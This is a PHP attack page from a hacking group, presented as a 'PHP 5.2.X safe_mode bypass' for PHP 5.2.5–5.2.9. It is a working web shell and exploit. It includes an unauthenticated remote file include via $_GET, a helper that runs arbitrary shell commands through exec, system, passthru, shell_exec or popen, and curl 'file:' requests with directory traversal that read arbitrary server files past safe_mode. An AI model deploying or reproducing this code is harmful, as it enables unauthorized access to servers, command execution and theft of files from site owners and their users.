<?php
if ($_GET['x']) { include($_GET['x']); }
if ($_POST['cxc']=='down') {
header("Content-disposition: filename=decode.txt");
header("Content-type: application/octetstream");
header("Pragma: no-cache");
header("Expires: 0");
error_reporting(0);
echo base64_decode($_POST['xCod']);
exit;
}

/**
 * @author Cold z3ro
 * @homepage http://www.hackteach.org/cc/
 * @greets to all www.hackteach.org/cc/ members , you are the best || vs xp10.cc 
 * @copyright 2008
 */
?>
<html>

<head>
<title>H-Teach Team http://www.hackteach.org</title>
</head>

<body bgcolor="#800000">
<?php
// some functions

//start H4ckT3ach Team
if  (empty($_POST['H4ckT3ach'] ) ) {
	}ELSE{
	$action = '?action=H4ckT3ach';
	echo '<table Width="100%" height="10%" bgcolor="#000000" border="1"><tr><td><center>
  <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse; border-style: dotted" bordercolor="#FFFFFF" width="100%" id="AutoNumber1">
    <tr>
      <td width="100%" colspan="5">
      <p align="center"><font color="#800000" size="7">Hack Teach Team</font></td>
    </tr>
    <tr>
      <td width="20%" style="font-family: (1)Fonts44-Net; font-size: 14pt; font-weight: bold; color: #FFFFFF; border-style: dotted; border-width: 1" align="center" bordercolor="#FFFFFF">
      <p align="center">HcJ</td>
      <td width="20%" style="font-family: (1)Fonts44-Net; font-size: 14pt; font-weight: bold; color: #FFFFFF; border-style: dotted; border-width: 1" align="center" bordercolor="#FFFFFF">
      ViRuSMaN</td>
      <td width="20%" style="font-family: (1)Fonts44-Net; font-size: 14pt; font-weight: bold; color: #FFFFFF; border-style: dotted; border-width: 1" align="center" bordercolor="#FFFFFF">
      AlQaIsEr</td>
      <td width="20%" style="font-family: (1)Fonts44-Net; font-size: 14pt; font-weight: bold; color: #FFFFFF; border-style: dotted; border-width: 1" align="center" bordercolor="#FFFFFF">
      Sas-TerrOrisT</td>
      <td width="20%" style="font-family: (1)Fonts44-Net; font-size: 14pt; font-weight: bold; color: #FFFFFF; border-style: dotted; border-width: 1" align="center" bordercolor="#FFFFFF">
      Cold z3ro</td>
    </tr>
    <tr>
      <td width="20%" style="border-style: dotted; border-width: 1" bordercolor="#FFFFFF">&nbsp;</td>
      <td width="60%" colspan="3" style="border-style: dotted; border-width: 1" bordercolor="#FFFFFF">
      <p align="center"><font color="#FFFFFF">
      <a href="http://www.hackteach.org"><font color="#FFFFFF">
      http://www.hackteach.org</font></a> || <a href="http://www.hack.ps">
      <font color="#FFFFFF">http://www.hack.ps</font></a> ||
      <a href="http://www.hackteach.net"><font color="#FFFFFF">
      http://www.hackteach.net</font></a> </font></td>
      <td width="20%" style="border-style: dotted; border-width: 1" bordercolor="#FFFFFF">&nbsp;</td>
    </tr>
  </table>
</table>';
exit;
}
//
//phpinfo
if (empty($_POST['phpinfo'] )) {
	}else{
	echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo()";
	exit;
}
//
// encode/decode
//
// uname
function getsystem()
{return php_uname('s')." ".php_uname('r')." ".php_uname('v');}; 
//
//safemode
function safe_mode(){
if(!$safe_mode && strpos(ex("echo abch0ld"),"h0ld")!=3){$_SESSION['safe_mode'] = 1;return "<b><font color=#800000 face=Verdana>ON</font></b>";}else{   $_SESSION['safe_mode'] = 0;return "<font color=#008000><b>OFF</b></font>";}
};function ex($in){
$out = '';
if(function_exists('exec')){exec($in,$out);$out = join("\n",$out);}elseif(function_exists('passthru')){ob_start();passthru($in);$out = ob_get_contents();ob_end_clean();}
elseif(function_exists('system')){ob_start();system($in);$out = ob_get_contents();ob_end_clean();}
elseif(function_exists('shell_exec')){$out = shell_exec($in);}
elseif(is_resource($f = popen($in,"r"))){$out = "";while(!@feof($f)) { $out .= fread($f,1024);}
pclose($f);}
return $out;}
//
?>

<div align="center">
  <center>

<table border="0" cellpadding="0" cellspacing="0" bordercolor="#111111" width="68%" id="AutoNumber1" bgcolor="#000000" height="416">
  <tr>
    <td width="100%" height="250">
    <p align="center">
    <img border="0" src="http://www.hackteach.net/apps/old/images/z3ro_01.gif" width="777" height="232"></td>
  </tr>
  <tr>
    <td width="100%" height="91" bgcolor="#8B8B8B">
    <p align="center"><font size="6">PHP/5.2.<font color="#800000" size="6">X</font> safe_mode </font><font color="#FFFFFF" size="6"> dso</font><font color="#800000" size="6">/</font><font color="#FFFFFF" size="6">CGI</font><font size="6">-PHP 
    Handler bypass</font></td>
  </tr>
  <tr>
    <td width="100%" height="43">

    <table border="1" cellpadding="0" cellspacing="0" bordercolor="#FFFFFF" width="100%" id="AutoNumber2" bgcolor="#8B8B8B" style="border-collapse: collapse">
      <tr>
        <td width="100%" bgcolor="#000000"><?
if (!isset($_GET['action']) OR empty($_GET['action'])) {
	 echo "<FORM method='POST' action='$REQUEST_URI' enctype='multipart/form-data'>";
	 echo "<p align='center'><INPUT type='submit'name='H4ckT3ach' value='H-teach' id=input1> <INPUT type='submit' name='phpinfo' value='PHPinfo' id=input>";}?>&nbsp;</td>
      </tr>
      <tr>
        <td width="100%" style="font-family: (1)Fonts44-Net; color: #FFFFFF; font-size: 8pt; font-weight: bold" dir="ltr">PHP : <?php echo getsystem();?></td>
      </tr>
      <tr>
        <td width="100%" style="font-family: (1)Fonts44-Net; color: #FFFFFF; font-size: 8pt; font-weight: bold" dir="ltr">PWD : <?php echo getcwd();?></td>
      </tr>
      <tr>
        <td width="100%" style="font-family: (1)Fonts44-Net; color: #FFFFFF; font-size: 8pt; font-weight: bold" dir="ltr">SM. : <?php echo safe_mode();?></td>
      </tr>
    </table>

    </td>
  </tr>
  <tr>
    <td width="100%" height="1"><?php
if (empty($_POST['z3r'])){
	
	echo '<form method="POST">';
	echo '<input type="text" name="z3r" size="90" value="/home/domains/hackteach.org/public_html/index.php">';
	echo '<input type="submit" value="Encode">';
	echo '</form>';
}else{
	$b4se64 =$_POST['z3r'];
	$heno =base64_encode($b4se64);
	echo '<p align="center">';
	print '<form method="post">
	<input type="submit" name="cz" size="90" value="'.$heno.'">
	<select name=type>
	<option value=php525>PHP 5.2.5</option>
	<option value=php526>PHP 5.2.6</option>
	<option value=php527>PHP 5.2.7</option>
	<option value=php528>PHP 5.2.8</option>
	<option value=php529>PHP 5.2.9</option>
	</select>
	</form>';
}

	
$ss		= $_POST['cz'];
$type 	= $_POST['type'];
$file 	= base64_decode($ss);
$z0 	= curl_init();


if( !empty($_POST['cz']) ){
	
if ($type=='php525' OR $type=='php526' OR $type=='php527' OR $type=='php528')
{
echo "<p align=center><textarea method='POST' name='xCod' cols='100' rows='30' wrar='off' >";
if((curl_exec(curl_init("file:ftp://../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../".$file))) aNd emptY($file));
}
		
// 5.2.9 => UP		
if ($type=='php529')
{
echo "<p align=center><textarea method='POST' name='xCod' cols='100' rows='30' wrar='off' >";
curl_setopt($z0, CURLOPT_URL, "file:file:///".$file."");
curl_setopt($z0, CURLOPT_HEADER, 0);
curl_exec  ($z0);
curl_close ($z0);
}

}
echo "</textarea></p>";

?></td>
  </tr>
  <tr>
    <td width="100%" style="font-family: (1)Fonts44-Net; color: #FFFFFF; font-size: 8pt; font-weight: bold" height="13"><?php if ($dec=='decode'){ echo "<p align=center><input type=hidden name=cxc value='down'><input type=submit name=submit value='DownLoad'></p></form>"; } ?></td>
  </tr>
  <tr>
    <td width="100%" style="font-family: (1)Fonts44-Net; color: #FFFFFF; font-size: 8pt; font-weight: bold" height="13">
    <p align="center"><font size="3">greets to members of </font> <a href="http://www.hackteach.org/cc">
    <font size="3" color="#8B8B8B">www.hackteach.org/cc</font></a></td>
  </tr>
  <tr>
    <td width="100%" style="font-family: (1)Fonts44-Net; color: #FFFFFF; font-size: 8pt; font-weight: bold" height="13">
    <p align="center"> <font size="2">Cod[3]d By Cold z3ro</font></td>
  </tr>
</table>

  </center>
</div>

</body>

</html>